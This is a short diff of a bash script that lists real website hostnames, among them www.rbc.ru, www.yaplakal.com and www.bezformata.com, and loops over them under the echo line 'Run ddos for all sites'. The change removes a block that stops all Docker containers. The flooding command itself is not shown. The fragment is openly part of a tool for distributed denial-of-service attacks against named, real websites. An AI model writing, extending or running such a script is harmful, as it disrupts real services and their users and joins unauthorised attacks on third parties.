@@ -160,12 +160,7 @@ declare -a sites=(
 "www.yaplakal.com"
 "www.rbc.ru"
 "www.bezformata.com"
-
 )
-
-echo "Stop all containers"
-docker stop $(docker ps -aq)
-echo "Docker containers stopped"
 
 echo "Run ddos for all sites"
 for site in "${sites[@]}"
